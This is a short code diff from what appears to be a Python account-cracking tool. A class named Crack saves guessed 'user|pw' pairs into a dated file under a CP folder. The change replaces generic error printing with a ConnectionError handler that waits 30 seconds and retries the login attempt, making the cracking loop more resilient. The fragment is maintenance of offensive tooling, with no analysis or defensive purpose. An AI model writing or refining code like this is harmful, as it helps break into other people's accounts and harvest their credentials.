@@ -712,8 +712,7 @@ class Crack:
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
 						break
 				else:continue
-		except Exception as e:
-			print(e)
+		except ConnectionError:
 			time.sleep(30)
 			self.metode_reguler(user,pwx,url)
 		self.loop +=1
